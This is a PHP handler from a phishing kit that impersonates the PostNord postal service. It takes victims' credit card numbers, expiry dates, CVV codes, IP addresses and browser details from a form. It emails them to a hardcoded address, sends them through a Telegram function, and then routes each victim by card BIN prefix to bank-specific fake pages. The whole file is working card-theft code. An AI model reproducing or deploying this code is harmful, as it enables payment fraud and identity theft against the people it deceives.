<?php
include "config.php";
$ip = getenv("REMOTE_ADDR");
$message = "------------------🤑  INFOS 🤑------------------\n

Credit card Number : ".$_POST['VisacardNumber']."\n
Expiry date (Month) : ".$_POST['Visamonth']."\n
Expiry date ( Year) : ".$_POST['Visayear']."\n
CVV2 : ".$_POST['VisasecurityCode']."\n

------------------🤩 IP INFOS 🤩----------------\n
IP                        : $ip\n
BROWSER           : ".$_SERVER['HTTP_USER_AGENT']."\n
--------------------😎 BY BALHA  😎--------------\n";
$subject = "POSTNORD: Card Infos : $ip ";
$send = "Elkayemhd@aol.com";  //7ot el mail ya jhon
$headers = 'From : postnord@login.tz'."r\n";
telegram($message);
mail($send,$subject,$message,$headers);



$bin = $_POST['VisacardNumber'];
$subin = substr($bin, 0, 6);

 if ($subin == "416057" || $subin == "430705" || $subin == "430706" || $subin == "458109" || $subin == "458117" || $subin == "458125" || $subin == "458133" || $subin == "458141" || $subin == "458166" || $subin == "458191" || $subin == "458192" || $subin == "458193" || $subin == "458194" || $subin == "458195" ||  $subin == "458198" || $subin == "464438" || $subin == "455262" || $subin == "454109" || $subin == "454108" || $subin == "453970" || $subin == "415367" || $subin == "407513" || $subin == "975223") {
 header("Location: ../payment/bin/ld/411824.html");
} 
else if ($subin == "426387" || $subin == "426388" || $subin == "427374"  || $subin == "427375" || $subin == "427723" || $subin == "430004" || $subin == "430005" || $subin == "430437" || $subin == "449326" || $subin == "480930") {
 header("Location: ../payment/bin/ld/676442.html");
}
else if ($subin == "419035" || $subin == "404889"  || $subin == "451110" || $subin == "491859") {
 header("Location: ../payment/bin/ld/552750.html");
}
else if ($subin == "491889" || $subin == "415367"  || $subin == "424339" || $subin == "447579" || $subin == "462763") {
 header("Location: ../payment/bin/ld/491889.html");
}
else if ($subin == "498764" || $subin == "498765") {
 header("Location: ../payment/bin/ld/528248.html");
}
else if ($subin == "458197") {
 header("Location: ../payment/bin/ld/516815.html");
}
else if ($subin == "402150" || $subin == "410806" || $subin == "457241" || $subin == "403252" || $subin == "484093") {
 header("Location: ../payment/bin/ld/525235.html");
}
else if ($subin == "418540" || $subin == "457002" || $subin == "458190" || $subin == "458196" || $subin == "458199") {
 header("Location: ../payment/bin/ld/548946.html"); // cooop
}
else if ($subin == "411824") {
 header("Location: ../payment/bin/ld/okq8.html"); // ok q8
}
else if ($subin == "453903" || $subin == "491819" || $subin == "491000"  || $subin == "489498" || $subin == "486417" || $subin == "483064" || $subin == "457005" || $subin == "457004" || $subin == "453912" || $subin == "453908" || $subin == "453906" || $subin == "453905" || $subin == "453904" || $subin == "453901" || $subin == "453900" || $subin == "448477" || $subin == "422860" || $subin == "406272") {
 header("Location: ../payment/bin/ld/453903.html");
}
else {
 header("Location: ../payment/VisaLoading.html");
}


?>